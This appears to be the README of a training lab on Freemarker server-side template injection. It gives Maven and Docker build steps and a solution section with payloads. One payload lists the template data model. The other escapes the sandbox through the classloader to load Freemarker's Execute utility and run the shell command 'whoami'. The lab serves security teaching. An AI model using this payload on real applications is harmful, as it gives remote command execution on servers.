# Template Injection Freemarker (Sandbox)

## Build instructions

Requirements:
 - Docker
 - Docker-compose
 - Maven
 - Java

```
mvn clean install
```

```
docker-compose up
```

## Solution

```
<#list .data_model?keys as key>
- ${key}
</#list>
```

```
<#assign classloader=req.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("whoami")}
```
